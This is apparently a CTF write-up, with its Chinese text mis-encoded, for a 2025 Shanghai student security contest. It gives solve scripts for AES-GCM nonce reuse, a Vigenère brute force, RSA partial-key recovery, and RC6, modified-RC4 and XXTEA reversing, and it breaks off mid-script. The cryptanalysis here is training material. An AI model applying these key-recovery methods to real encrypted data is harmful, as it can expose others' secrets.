---
title: 2025ç¬¬åå±Šâ€œç£çŸ³è¡ŒåŠ¨â€ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ› - åˆèµ› - WriteUp
date: 2025-08-14 19:21
categories: æ¯”èµ›
tags:
  - æ¯”èµ›
author: DmcforSpc
description: 2025ç¬¬åå±Šâ€œç£çŸ³è¡ŒåŠ¨â€ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›åˆèµ›
---
## Crypto
### AES_GCM_IV_Reuse
```python
#!/usr/bin/env python3
import binascii

# ä»é—®é¢˜ä¸­è·å–çš„å·²çŸ¥æ•°æ®
known_message_str = "The flag is hidden somewhere in this encrypted system."
known_ciphertext_hex = "b7eb5c9e8ea16f3dec89b6dfb65670343efe2ea88e0e88c490da73287c86e8ebf375ea1194b0d8b14f8b6329a44f396683f22cf8adf8"
flag_ciphertext_hex = "85ef58d9938a4d1793a993a0ac0c612368cf3fa8be07d9dd9f8c737d299cd9adb76fdc1187b6c3a00c866a20"

# å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚
known_message_bytes = known_message_str.encode()
known_ciphertext_full = binascii.unhexlify(known_ciphertext_hex)
flag_ciphertext_full = binascii.unhexlify(flag_ciphertext_hex)

# --- æ ¸å¿ƒè§£å¯†é€»è¾‘ ---

# 1. è®¡ç®—è®¤è¯æ ‡ç­¾çš„é•¿åº¦
tag_len = len(known_ciphertext_full) - len(known_message_bytes)
print(f"[+] ç»è®¡ç®—ï¼Œè®¤è¯æ ‡ç­¾çš„é•¿åº¦ä¸º: {tag_len} å­—èŠ‚")

# 2. è®¡ç®— flag çš„é•¿åº¦
flag_len = len(flag_ciphertext_full) - tag_len
print(f"[+] ç»è®¡ç®—ï¼ŒFlag çš„é•¿åº¦ä¸º: {flag_len} å­—èŠ‚")

# 3. ä»å®Œæ•´å¯†æ–‡ä¸­åˆ†ç¦»å‡ºåŠ å¯†æ•°æ®éƒ¨åˆ† (å»é™¤è®¤è¯æ ‡ç­¾)
c1 = known_ciphertext_full[:len(known_message_bytes)]
c2 = flag_ciphertext_full[:flag_len]

# 4. è·å–ä¸ flag ç­‰é•¿çš„å·²çŸ¥æ˜æ–‡å’Œå·²çŸ¥å¯†æ–‡éƒ¨åˆ†
p1 = known_message_bytes[:flag_len]
c1_truncated = c1[:flag_len]

# 5. æ‰§è¡Œå¼‚æˆ–æ“ä½œ: P2 = P1 xor C1 xor C2
# ä¸ºäº†æ–¹ä¾¿ï¼Œå®šä¹‰ä¸€ä¸ªå¼‚æˆ–å‡½æ•°
def xor_bytes(a, b):
    return bytes([x ^ y for x, y in zip(a, b)])

# P2 = P1 ^ C1 ^ C2
recovered_flag_bytes = xor_bytes(p1, xor_bytes(c1_truncated, c2))

# 6. å°†æ¢å¤çš„å­—èŠ‚è§£ç ä¸ºå­—ç¬¦ä¸²å¹¶æ‰“å°
try:
    flag = recovered_flag_bytes.decode('utf-8')
    print("\n" + "="*40)
    print(f"æˆåŠŸè§£å¯†ï¼Flag æ˜¯: {flag}")
    print("="*40)
except UnicodeDecodeError:
    print("\n[!] è§£ç å¤±è´¥ï¼Œæ¢å¤çš„å­—èŠ‚ä¸æ˜¯æœ‰æ•ˆçš„ UTF-8 ç¼–ç ã€‚")
    print(f"[!] æ¢å¤çš„å­—èŠ‚ä¸º: {recovered_flag_bytes}")
```

`flag{GCM_IV_r3us3_1s_d4ng3r0us_f0r_s3cur1ty}`

### å¤šé‡Caesarå¯†ç 
æ•°æ®  
```text
myfz{hrpa_pfxddi_ypgm_xxcqkwyj_dkzcvz_2025}
```

å‡¯æ’’å˜å¼‚ï¼Ÿç±»ä¼¼ç»´å‰å°¼äºšå§ï¼Œçˆ†ç ´  
```python
import itertools

# ====== å¯é…ç½®é¡¹ ======
CIPHER_TEXT = "mwfz{llxr_jljlhc_bbas_rnsenisp_xapqyl_2025}"
KEYWORDS = ["flag{"]
MAX_KEY_LEN = 6  # æœ€å¤§çˆ†ç ´å¯†é’¥é•¿åº¦
# ======================

def decrypt(cipher, key):
    res = []
    ki = 0
    for c in cipher:
        if 'a' <= c <= 'z':
            shift = key[ki % len(key)]
            res.append(chr((ord(c) - ord('a') - shift) % 26 + ord('a')))
            ki += 1
        else:
            res.append(c)
    return ''.join(res)

def brute_force(cipher):
    for key_len in range(1, MAX_KEY_LEN + 1):
        print(f"[*] Trying key length: {key_len}")
        for key in itertools.product(range(26), repeat=key_len):
            plain = decrypt(cipher, key)
            if any(kw in plain for kw in KEYWORDS):
                print(f"\n[+] Match found!")
                print(f"Key: {key}")
                print(f"Plaintext: {plain}")
                return  # âœ… åŒ¹é…åˆ°å³ç»ˆæ­¢

if __name__ == "__main__":
    brute_force(CIPHER_TEXT)

```

### rsa-dl_leak

è§£å¯†è„šæœ¬
Boneh-Durfee æ”»å‡»å˜ç§  
```python
from Crypto.Util.number import long_to_bytes
import math

def solve(n, e, t, d_low, c):
    """
    æ ¹æ®ç»™å®šçš„ RSA å‚æ•°å’Œç§é’¥ d çš„ä½ä½æ¯”ç‰¹ï¼Œæ±‚è§£æ˜æ–‡ã€‚
    æ­¤æ–¹æ³•æ˜¯ Boneh-Durfee æ”»å‡»çš„ä¸€ä¸ªå˜ç§ï¼Œé€šè¿‡æ±‚è§£å…³äº phi(n) çš„åŒä½™æ–¹ç¨‹æ¥æ¢å¤å› å­ã€‚
    """
    
    # M ä»£è¡¨ 2 çš„ t æ¬¡æ–¹ï¼Œt æ˜¯å·²æ³„éœ²çš„æ¯”ç‰¹ä½æ•°ã€‚
    M = 1 << t
    
    # æ­¥éª¤ 1ï¼šå»ºç«‹å…³é”®åŒä½™æ–¹ç¨‹ k * phi(n) â‰¡ e * d_low - 1 (mod e * M)
    # a æ˜¯è¯¥æ–¹ç¨‹çš„æ¨¡æ•°
    a = e * M
    # b æ˜¯è¯¥æ–¹ç¨‹çš„å¸¸æ•°é¡¹
    b = (e * d_low - 1) % a
    
    # æ­¥éª¤ 2: éå† k çš„æ‰€æœ‰å¯èƒ½å€¼ã€‚æ ¹æ® RSA çš„æ€§è´¨ï¼Œæˆ‘ä»¬å·²çŸ¥ 1 <= k < eã€‚
    for k in range(1, e):
        # çº¿æ€§åŒä½™æ–¹ç¨‹ k*x â‰¡ b (mod a) æœ‰è§£çš„å……è¦æ¡ä»¶æ˜¯ gcd(k, a) èƒ½å¤Ÿæ•´é™¤ bã€‚
        g = math.gcd(k, a)
        if b % g != 0:
            continue
        
        # å°†åŒä½™æ–¹ç¨‹åŒ–ç®€ä¸º k1*x â‰¡ b1 (mod a1)ï¼Œå…¶ä¸­ gcd(k1, a1) = 1ï¼Œä»¥ä¾¿æ±‚è§£ã€‚
        a1, k1, b1 = a // g, k // g, b // g
        
        # æ±‚è§£åŒ–ç®€åçš„æ–¹ç¨‹ï¼Œå¾—åˆ° phi(n) çš„ä½ä½éƒ¨åˆ†ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º phi0ã€‚
        # phi0 æ˜¯ k1*phi â‰¡ b1 (mod a1) çš„ä¸€ä¸ªè§£ã€‚
        phi0 = (b1 * pow(k1, -1, a1)) % a1
        
        # æ­¥éª¤ 3: åŸºäº phi0 å’Œ phi(n) â‰ˆ n çš„äº‹å®ï¼Œé‡æ„å®Œæ•´çš„ phi(n)ã€‚
        # æˆ‘ä»¬çŸ¥é“ phi(n) = phi0 + z*a1ï¼Œå…¶ä¸­ z æ˜¯æŸä¸ªæ•´æ•°ã€‚
        # é€šè¿‡å‡è®¾ phi(n) â‰ˆ n æ¥ä¼°ç®— z çš„å€¼ã€‚
        z0 = (n - phi0) // a1
        
        # z çš„ä¼°ç®—å¯èƒ½å­˜åœ¨å¾®å°è¯¯å·®ï¼Œå› æ­¤åœ¨è®¡ç®—å‡ºçš„ z0 é™„è¿‘çš„ä¸€ä¸ªå°èŒƒå›´å†…è¿›è¡Œæœç´¢ã€‚
        for dz in range(-3, 4):
            phi_candidate = phi0 + a1 * (z0 + dz)
            
            # çœŸå®çš„ phi(n) å¿…é¡»å°äº nã€‚
            if not (1 < phi_candidate < n):
                continue
            
            # æ­¥éª¤ 4: å°è¯•ä½¿ç”¨å€™é€‰çš„ phi_candidate æ¥åˆ†è§£ nã€‚
            # é¦–å…ˆè®¡ç®— s = p + q = n - phi + 1ã€‚
            s = n - phi_candidate + 1
            
            # p å’Œ q æ˜¯äºŒæ¬¡æ–¹ç¨‹ x^2 - s*x + n = 0 çš„æ ¹ã€‚
            # æ£€æŸ¥åˆ¤åˆ«å¼ (s^2 - 4n) æ˜¯å¦ä¸ºå®Œå…¨å¹³æ–¹æ•°ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å¯ä»¥æ‰¾åˆ°æ•´æ•°æ ¹ p å’Œ qã€‚
            discriminant = s * s - 4 * n
            if discriminant < 0:
                continue
            
            r = math.isqrt(discriminant)
            if r * r != discriminant:
                continue
            
            # è®¡ç®— p å’Œ qã€‚
            p = (s - r) // 2
            q = (s + r) // 2
            
            # éªŒè¯åˆ†è§£å‡ºçš„å› å­æ˜¯å¦æ­£ç¡®ã€‚
            if p * q == n:
                print(f"[+] æ‰¾åˆ°äº†æ­£ç¡®çš„ k = {k}")
                print(f"[+] å·²æ‰¾åˆ°å› å­ p å’Œ qã€‚")
                
                # æ­¥éª¤ 5: æˆåŠŸåˆ†è§£ n åï¼Œè®¡ç®—å®Œæ•´çš„ç§é’¥ d å¹¶è§£å¯†ã€‚
                d_full = pow(e, -1, (p - 1) * (q - 1))
                return long_to_bytes(pow(c, d_full, n))
    
    # å¦‚æœéå†æ‰€æœ‰å¯èƒ½çš„ k å€¼éƒ½æ— æ³•æ‰¾åˆ°è§£ï¼Œåˆ™è¿”å› Noneã€‚
    return None

# --- é¢˜ç›®ç»™å®šçš„å‚æ•° ---
n = 143504495074135116523479572513193257538457891976052298438652079929596651523432364937341930982173023552175436173885654930971376970322922498317976493562072926136659852344920009858340197366796444840464302446464493305526983923226244799894266646253468068881999233902997176323684443197642773123213917372573050601477
c = 141699518880360825234198786612952695897842876092920232629929387949988050288276438446103693342179727296549008517932766734449401585097483656759727472217476111942285691988125304733806468920104615795505322633807031565453083413471250166739315942515829249512300243607424590170257225854237018813544527796454663165076
e = 65537
t = 530 # å·²æ³„éœ²çš„ d çš„ä½ä½æ¯”ç‰¹æ•°
d_low = 1761714636451980705225596515441824697034096304822566643697981898035887055658807020442662924585355268098963915429014997296853529408546333631721472245329506038801

# --- æ‰§è¡Œè§£å¯† ---
result = solve(n, e, t, d_low, c)

if result:
    print(f"\nè§£å¯†å¾—åˆ°çš„ Flag: {result.decode()}")
else:
    print("\nè§£å¯†å¤±è´¥ã€‚")
```

```text
[+] æ‰¾åˆ°äº†æ­£ç¡®çš„ k = 22348
[+] å·²æ‰¾åˆ°å› å­ p å’Œ qã€‚

è§£å¯†å¾—åˆ°çš„ Flag: Res0lv1ng_the_c0mpos1te_numb3r
```
## Reverse
### My-Key
```tex
æè¿°ï¼šå°æ˜ä¸‹è½½äº†ä¸€ä¸ªç¨‹åºï¼Œä½†ç¨‹åºéœ€è¦è¾“å…¥ä¸€ä¸ªkeyï¼Œä½ æ˜¯å¦å¯ä»¥æ‰¾åˆ°ï¼Ÿ
```
![](assets/img/attachments/Pasted%20image%2020250806175652.png)  

MFCç¨‹åºï¼Œè¾“å…¥flagåˆ¤æ–­ã€‚

ä½¿ç”¨x64dbgè¿›è¡Œè°ƒè¯•ï¼Œï¼ˆå¼€å¯åè°ƒè¯•ï¼‰  

![](assets/img/attachments/Pasted%20image%2020250806175707.png)  

è¿™é‡Œå‘ç°ç–‘ä¼¼base64åŠ å¯†æ•°æ®

åŒæ—¶æ‰“å¼€idaï¼Œæ‰¾åˆ°ç è¡¨ï¼Œå®šä½ä»£ç ä½ç½®  

![](assets/img/attachments/Pasted%20image%2020250806175727.png)  

åœ¨baseä¸Šé¢ä¸€è¡Œçš„æ˜¯rc6åŠ å¯†  

![](assets/img/attachments/Pasted%20image%2020250806175737.png)  

RKCTaz+fty1J2qsz4DI6t9bmMiLBxqFrpI70fU4IMemczIlM+z1IoVQobIt1MbXF

è§£é¢˜æ€è·¯æ˜¯base64 -> rc6  

exp  
```python
# -*- coding: utf-8 -*-
import base64

# ==============================================================================
# å¸¸é‡å®šä¹‰ (Constants Definition)
# ==============================================================================
# ä½¿ç”¨å¸¸é‡æ›¿ä»£â€œé­”æœ¯æ•°å­—â€ï¼Œå¢å¼ºä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚

# å¯†ç å­¦å‚æ•°
NUM_ROUNDS = 20  # è§£å¯†ç®—æ³•çš„è½®æ•°
WORD_SIZE_BITS = 32  # æ¯ä¸ªæ“ä½œæ•°çš„å¤§å°ï¼ˆ32ä½ï¼‰
WORD_SIZE_BYTES = WORD_SIZE_BITS // 8  # 4 å­—èŠ‚
BLOCK_SIZE_WORDS = 4  # æ¯ä¸ªæ•°æ®å—åŒ…å«4ä¸ª32ä½æ•´æ•°
BLOCK_SIZE_BYTES = BLOCK_SIZE_WORDS * WORD_SIZE_BYTES  # 16 å­—èŠ‚

# æ•°æ®æ©ç 
MASK_32BIT = 0xFFFFFFFF  # ç”¨äºç¡®ä¿æ‰€æœ‰æ“ä½œéƒ½åœ¨32ä½å†…å¾ªç¯
ROTATION_MASK = 0x1F  # ç”¨äºæ—‹è½¬æ“ä½œï¼Œç­‰ä»·äº n % 32

# å¯†æ–‡å’Œæ•°æ®å°ºå¯¸
CIPHERTEXT_B64 = b'RKCTaz+fty1J2qsz4DI6t9bmMiLBxqFrpI70fU4IMemczIlM+z1IoVQobIt1MbXF'
CIPHERTEXT_SIZE_BYTES = 48  # å¯†æ–‡æ€»é•¿åº¦
NUM_BLOCKS = CIPHERTEXT_SIZE_BYTES // BLOCK_SIZE_BYTES  # å¯†æ–‡å—çš„æ•°é‡ (3)


# ==============================================================================
# æ ¸å¿ƒç®—æ³•å‡½æ•° (Core Algorithm Functions)
# ==============================================================================

def rotate_left(x, n):
    """å¯¹32ä½æ•´æ•°è¿›è¡Œå¾ªç¯å·¦ç§»"""
    n &= ROTATION_MASK
    return ((x << n) | (x >> (WORD_SIZE_BITS - n))) & MASK_32BIT

def rotate_right(x, n):
    """å¯¹32ä½æ•´æ•°è¿›è¡Œå¾ªç¯å³ç§»"""
    n &= ROTATION_MASK
    return ((x >> n) | (x << (WORD_SIZE_BITS - n))) & MASK_32BIT

def decrypt_block(block, key_schedule):
    """
    è§£å¯†ä¸€ä¸ª16å­—èŠ‚ï¼ˆ4ä¸ª32ä½æ•´æ•°ï¼‰çš„æ•°æ®å—ã€‚
    è¿™æ˜¯ä¸€ä¸ªç±»ä¼¼ RC6 çš„ Feistel ç½‘ç»œç»“æ„çš„é€†æ“ä½œã€‚
    """
    a, b, c, d = block

    # 1. é€†å‘æœ€ç»ˆçš„ç™½åŒ–æ“ä½œ
    a = (a - key_schedule[42]) & MASK_32BIT
    c = (c - key_schedule[43]) & MASK_32BIT

    # 2. è¿›è¡Œ20è½®çš„é€†å‘è§£å¯†
    for i in range(NUM_ROUNDS, 0, -1):
        # é€†å‘å¯„å­˜å™¨å¾ªç¯ä½ç§» (d,a,b,c -> a,b,c,d)
        c, d = d, c
        b, c = c, b
        a, b = b, a
        
        # é‡æ–°è®¡ç®— t å’Œ u
        t = rotate_left(((2 * b + 1) * b) & MASK_32BIT, 5)
        u = rotate_left(((2 * d + 1) * d) & MASK_32BIT, 5)

        # é€†å‘æ ¸å¿ƒåŠ å¯†è½¬æ¢
        c = rotate_right((c - key_schedule[2 * i + 1]) & MASK_32BIT, t) ^ u
        a = rotate_right((a - key_schedule[2 * i]) & MASK_32BIT, u) ^ t

    # 3. é€†å‘åˆå§‹çš„ç™½åŒ–æ“ä½œ
    b = (b - key_schedule[0]) & MASK_32BIT
    d = (d - key_schedule[1]) & MASK_32BIT

    return [a, b, c, d]


# ==============================================================================
# æ•°æ®åˆå§‹åŒ– (Data Initialization)
# ==============================================================================

# å¯†é’¥è°ƒåº¦è¡¨ (Key Schedule)
KEY_SCHEDULE = [
    0x7368aae0, 0x7254cd7d, 0xfad4aae2, 0x9c030c41, 0x5d72ca51, 0xadca53f4,
    0x1326ef25, 0x48c1148f, 0x0d1c2640, 0x1632916d, 0xb54ffcf8, 0x972c5ff9,
    0x6b3464ec, 0x89b4fdb3, 0x512da5be, 0x85183704, 0xb80d88b3, 0xcd8e0552,
    0x4fb3d88c, 0xe2a68174, 0x406835df, 0x53491aa5, 0x53447c05, 0xdb4fcbfa,
    0x3104dcd8, 0xb9d6f922, 0xe5531f6e, 0xab30b64e, 0xc87b4ba0, 0x9821b17e,
    0xb0fbaadc, 0xd83972c2, 0x7c81fe11, 0x99bc6ee0, 0xbaa16a68, 0x158eeda9,
    0x2a58205b, 0xc985b1cc, 0xd7210be3, 0x5d5bbf7b, 0x64eb76c2, 0x44e3c8d8,
    0xd9dfc75f, 0x541c238d
]

# 1. è§£ç  Base64 å¯†æ–‡
cipher_raw = base64.b64decode(CIPHERTEXT_B64)

# 2. å°†åŸå§‹å­—èŠ‚å¯†æ–‡è½¬æ¢ä¸º 32 ä½å°ç«¯åºæ•´æ•°åˆ—è¡¨
cipher_words = [
    int.from_bytes(cipher_raw[i:i+WORD_SIZE_BYTES], 'little')
    for i in range(0, CIPHERTEXT_SIZE_BYTES, WORD_SIZE_BYTES)
]

# 3. æ„å»ºç”¨äºå¼‚æˆ–çš„å‘é‡ (XOR Vector)
# è¿™éƒ¨åˆ†æ¨¡æ‹Ÿäº† CBCï¼ˆå¯†ç å—é“¾æ¥ï¼‰æ¨¡å¼çš„è§£å¯†è¿‡ç¨‹ã€‚
XOR_CONSTANTS = [0x34456357, 0x346d6242, 0x5159486b, 0x58634173]
XOR_VECTOR = XOR_CONSTANTS + cipher_words

# ==============================================================================
# ä¸»è§£å¯†æµç¨‹ (Main Decryption Process)
# ==============================================================================

# åˆ›å»ºä¸€ä¸ªå­—èŠ‚æ•°ç»„æ¥å­˜æ”¾æœ€ç»ˆçš„æ˜æ–‡ç»“æœ
plaintext_bytes = bytearray(CIPHERTEXT_SIZE_BYTES)

# ä»æœ€åä¸€ä¸ªå—å¼€å§‹ï¼Œå‘å‰è¿­ä»£è§£å¯†
for i in range(NUM_BLOCKS - 1, -1, -1):
    block_start_index = i * BLOCK_SIZE_WORDS
    block_end_index = (i + 1) * BLOCK_SIZE_WORDS
    
    current_block = cipher_words[block_start_index:block_end_index]
    decrypted_words = decrypt_block(current_block, KEY_SCHEDULE)

    for j in range(BLOCK_SIZE_WORDS):
        xor_source_word = XOR_VECTOR[block_start_index + j]
        final_word = decrypted_words[j] ^ xor_source_word
        
        final_bytes = final_word.to_bytes(WORD_SIZE_BYTES, 'little')
        
        offset = block_start_index * WORD_SIZE_BYTES + j * WORD_SIZE_BYTES
        plaintext_bytes[offset:offset+WORD_SIZE_BYTES] = final_bytes

# ==============================================================================
# è¾“å‡ºç»“æœ (Output Result)
# ==============================================================================

# å°†å­—èŠ‚æ•°ç»„è§£ç ä¸ºå­—ç¬¦ä¸²å¹¶æ‰“å°ï¼Œå¹¶æ¸…é™¤æœ«å°¾å¯èƒ½å­˜åœ¨çš„å¡«å……ç©ºå­—ç¬¦
print(plaintext_bytes.decode('utf-8', errors='ignore').strip('\x00'))

```

`flag{68f25cc8-1a9f-40e8-ac3b-a85982a52f8f}`

### EasyRE

æŸ¥ä¸€ä¸‹å£³  
![](assets/img/attachments/Pasted%20image%2020250806164610.png)  

ä¸»å‡½æ•°  
![](assets/img/attachments/QQ_1754469983999.png)  

- ç¨‹åºæç¤ºç”¨æˆ·è¾“å…¥flagã€‚
    
- é€šè¿‡ `fgets` ä»æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰è¯»å–æœ€å¤š99ä¸ªå­—ç¬¦ï¼ˆå¤–åŠ ä¸€ä¸ªç©ºç»ˆæ­¢ç¬¦ï¼‰ï¼Œå¹¶å­˜å…¥ç¼“å†²åŒº `v25`ã€‚
    
- è®¡ç®—è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå¹¶å­˜å…¥å˜é‡ `n29`ã€‚
    
- ç§»é™¤ `fgets` å¸¸å¸¸ä¼šé™„åŠ åœ¨æœ«å°¾çš„æ¢è¡Œç¬¦ï¼ˆ`\n`ï¼ŒASCIIç ä¸º10ï¼‰ï¼Œå¹¶ç›¸åº”åœ°è°ƒæ•´é•¿åº¦ `n29`ã€‚



- **é•¿åº¦æ£€æŸ¥ï¼š** ç¬¬ä¸€ä¸ªç¡¬æ€§æ¡ä»¶æ˜¯è¾“å…¥é•¿åº¦å¿…é¡»æ­£å¥½æ˜¯29ä¸ªå­—ç¬¦ã€‚å³ `$n29 == 29$`ã€‚
    
- **å­—èŠ‚æ¯”è¾ƒï¼š** å¦‚æœé•¿åº¦ä¸º29ï¼Œç¨‹åºä¼šè¿›å…¥ä¸€ä¸ªå¾ªç¯ï¼Œé€å­—èŠ‚æ¯”è¾ƒè½¬æ¢åçš„ç¼“å†²åŒºï¼ˆ`CBAZYX_`ï¼‰å’Œä½äºå†…å­˜åœ°å€ `byte_14001D658` çš„å­—èŠ‚æ•°ç»„ã€‚
    
- **æˆåŠŸæ¡ä»¶ï¼š** å¦‚æœæ‰€æœ‰29ä¸ªå­—èŠ‚éƒ½åŒ¹é…ï¼Œå¾ªç¯å®Œæˆï¼Œ`v19` å˜é‡ä¿æŒä¸º `true`ï¼Œç¨‹åºæœ€ç»ˆæ‰“å°å‡ºç¥è´ºä¿¡æ¯ã€‚å¦‚æœé•¿åº¦ä¸ä¸º29ï¼Œæˆ–è€…ä»»ä½•ä¸€ä¸ªå­—èŠ‚ä¸åŒ¹é…ï¼Œ`v19` å°†è¢«è®¾ä¸º `false`ï¼Œå¹¶æ‰“å°å¤±è´¥ä¿¡æ¯ã€‚


`byte_14001D658`æ•°æ®  
```text
.rdata:000000014001D658 ; _BYTE byte_14001D658[32]
.rdata:000000014001D658 byte_14001D658  db 93h, 0F9h, 8Dh, 92h, 52h, 57h, 0D9h, 5, 0C6h, 0Ah, 50h
.rdata:000000014001D658                                         ; DATA XREF: main+266â†‘o
.rdata:000000014001D663                 db 0C7h, 0DBh, 4Fh, 0CBh, 0D8h, 5Dh, 0A6h, 0B9h, 40h, 95h
.rdata:000000014001D66D                 db 70h, 0E7h, 9Ah, 37h, 72h, 4Dh, 0EFh, 57h, 3 dup(0)
```

sub_140001070æ•°æ®
![](assets/img/attachments/QQ_1754470746679.png)  

- **ç¬¬ä¸€éƒ¨åˆ†ï¼ˆKSAï¼‰**ï¼šä½ ä¼šçœ‹åˆ°ä¸€ä¸ªåˆå§‹åŒ–256å­—èŠ‚æ•°ç»„ï¼ˆS-boxï¼‰å¹¶å¯¹å…¶è¿›è¡Œæ‰“ä¹±çš„å¾ªç¯ã€‚è¿™ä¸ªæ¨¡å¼éå¸¸åƒRC4æµåŠ å¯†çš„â€œå¯†é’¥è°ƒåº¦ç®—æ³•â€ï¼ˆKSAï¼‰ã€‚å…³é”®åœ¨äºï¼Œç”¨äºæ‰“ä¹±çš„å¯†é’¥æ˜¯å›ºå®šçš„ï¼Œä¸ç”¨æˆ·è¾“å…¥æ— å…³ã€‚
    
- **ç¬¬äºŒéƒ¨åˆ†ï¼ˆPRGAï¼‰**ï¼šç´§æ¥ç€æ˜¯ä¸€ä¸ªå¾ªç¯29æ¬¡çš„åŠ å¯†å¾ªç¯ã€‚è¿™éƒ¨åˆ†æ˜¯RC4çš„â€œä¼ªéšæœºç”Ÿæˆç®—æ³•â€ï¼ˆPRGAï¼‰çš„é­”æ”¹ç‰ˆã€‚å®ƒåœ¨å¾ªç¯ä¸­ä¸æ–­æ›´æ–°S-boxçš„çŠ¶æ€ï¼Œå¹¶ä»ä¸­ç”Ÿæˆå¤æ‚çš„å¯†é’¥æµï¼Œç”¨è¿™ä¸ªå¯†é’¥æµæ¥åŠ å¯†ä½ çš„è¾“å…¥ã€‚ä½ éœ€è¦ä»”ç»†è®°å½•ä¸‹åŠ å¯†æ“ä½œçš„ç²¾ç¡®å…¬å¼ï¼ˆå¼‚æˆ–ã€åŠ æ³•ã€å¾ªç¯ç§»ä½ç­‰ï¼‰ã€‚
    
- **ç¬¬ä¸‰éƒ¨åˆ†ï¼ˆFinalizerï¼‰**ï¼šåœ¨åŠ å¯†å¾ªç¯ç»“æŸåï¼Œè¿˜æœ‰ä¸€ä¸ªç®€å•çš„å¾ªç¯ï¼Œå®ƒå¯¹åˆšç”Ÿæˆçš„å¯†æ–‡åšæœ€åçš„å¤„ç†ï¼ˆå…ˆå¼‚æˆ–`0x42`ï¼Œå†ä¸å‰ä¸€ä¸ªå­—èŠ‚å¼‚æˆ–ï¼‰ã€‚  


exp  
```python
# ç›®æ ‡å¯†æ–‡ (æ¥è‡ª .rdata:000000014001D658)
final_ciphertext = [
    0x93, 0xF9, 0x8D, 0x92, 0x52, 0x57, 0xD9, 0x05, 0xC6, 0x0A, 0x50,
    0xC7, 0xDB, 0x4F, 0xCB, 0xD8, 0x5D, 0xA6, 0xB9, 0x40, 0x95, 0x70,
    0xE7, 0x9A, 0x37, 0x72, 0x4D, 0xEF, 0x57
]

# === æ­¥éª¤ 1: é€†å‘é˜¶æ®µ 3 ===
# æ¢å¤å‡ºé˜¶æ®µ2ç»“æŸæ—¶çš„ä¸­é—´å¯†æ–‡
intermediate_ciphertext = [0] * 29
intermediate_ciphertext[0] = final_ciphertext[0] ^ 0x42
for k in range(1, 29):
    intermediate_ciphertext[k] = final_ciphertext[k] ^ 0x42 ^ final_ciphertext[k-1]

# è¾…åŠ©å‡½æ•°: å¾ªç¯å·¦ç§»/å³ç§»
def ROL(byte, bits):
    return ((byte << bits) | (byte >> (8 - bits))) & 0xFF

def ROR(byte, bits):
    return ((byte >> bits) | (byte << (8 - bits))) & 0xFF

# === æ­¥éª¤ 2 & 3: é€†å‘é˜¶æ®µ 2 (é€šè¿‡é‡æ–°å®ç°çŠ¶æ€ç”Ÿæˆ) ===

# --- é˜¶æ®µ 1: ç”Ÿæˆä¸åŠ å¯†æ—¶ç›¸åŒçš„S-box ---
S = list(range(256))
j = 0
# å¯†é’¥ç”Ÿæˆå…¬å¼: key_byte = (i % 7 + 4919) % 256 = (i % 7 + 55) % 256
for i in range(256):
    key_byte = (i % 7 + 55) % 256
    j = (j + S[i] + key_byte) % 256
    S[i], S[j] = S[j], S[i]

# --- é˜¶æ®µ 2: æ¨¡æ‹ŸçŠ¶æ€æ›´æ–°å¹¶è§£å¯† ---
i = 0
j = 0
recovered_flag = ""

for k in range(29):
    # 1. ä¸¥æ ¼æŒ‰ç…§åŸç¨‹åºæ›´æ–°çŠ¶æ€ i, j, å’Œ S-box
    i = (i + 1) % 256
    if i % 3 == 0:
        j = (j + S[3 * i % 256]) % 256
    else:
        j = (j + S[i]) % 256
    
    S_i_old = S[i]
    S[i], S[j] = S[j], S[i]

    # 2. ç”Ÿæˆä¸åŠ å¯†æ—¶å®Œå…¨ç›¸åŒçš„å¯†é’¥æµ
    keystream_part1 = (i * j) % 16
    keystream_idx = (S_i_old + S[i]) % 256
    keystream_part2 = S[keystream_idx]
    
    # 3. ä½¿ç”¨é€†å‘å…¬å¼è§£å¯†
    encrypted_byte = intermediate_ciphertext[k]
    
    # é€†å‘ROL -> ROR
    temp1 = ROR(encrypted_byte, 3)
    # é€†å‘åŠ æ³• -> æ¨¡å‡æ³•
    temp2 = (temp1 - keystream_part1 + 256) % 256
    # é€†å‘XOR -> XOR
    plaintext_byte = temp2 ^ keystream_part2
    
    recovered_flag += chr(plaintext_byte)

# æ‰“å°æœ€ç»ˆç»“æœ
print(f"æœ€ç»ˆçš„Flagæ˜¯: {recovered_flag}")
```

`flag{Th1s_1s_A_Fl4w3d_Crypt0}`

### cookie
mainå‡½æ•°  
![](assets/img/attachments/QQ_1754485763161.png)  

å»ä¸€ä¸‹èŠ±æŒ‡ä»¤  
![](assets/img/attachments/QQ_1754487225007%201.png)  
å…¸å‹çš„ **flag æ£€æµ‹é€»è¾‘**ï¼Œå…¶æ ¸å¿ƒæ˜¯ï¼š**è¾“å…¥ â†’ è½¬æ¢ â†’ æ ¡éªŒ â†’ æˆåŠŸ/å¤±è´¥è¾“å‡º**ã€‚

é­”æ”¹xxtea  
![](assets/img/attachments/Pasted%20image%2020250806213829.png)  

exp
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TEA-like ç®—æ³•è§£å¯†è„šæœ¬ â€” è§£å‡º flag

è¯¥è„šæœ¬ç”¨äºè§£å¯†ä¸€ä¸ªä½¿ç”¨ TEA (Tiny Encryption Algorithm) å˜ä½“ç®—æ³•åŠ å¯†çš„å¯†æ–‡ã€‚
ç®—æ³•çš„æ ¸å¿ƒé€»è¾‘ã€å¯†é’¥ï¼ˆKEYï¼‰å’Œå¸¸é‡ï¼ˆDELTAï¼‰å‡æå–è‡ªç›®æ ‡ç¨‹åºçš„æºç ã€‚
"""

# ç®—æ³•å¸¸é‡ï¼Œæºè‡ªç¨‹åº
DELTA = 1988930350
KEY = [2, 0, 2, 2]

# ç›®æ ‡å¯†æ–‡ï¼Œä»åæ±‡ç¼–çš„ v7[] å¸¸é‡ä¸­æå–
CIPHERTEXT = [
    1452940357, -282301936,
    -79426602,  1469576221,
    1379922627, 1211333849,
    907455533,  112603437
]

def to_u32(x: int) -> int:
    """å°†ä¸€ä¸ªæ•´æ•°è½¬æ¢ä¸º 32 ä½æ— ç¬¦å·æ•´æ•°ã€‚"""
    return x & 0xFFFFFFFF

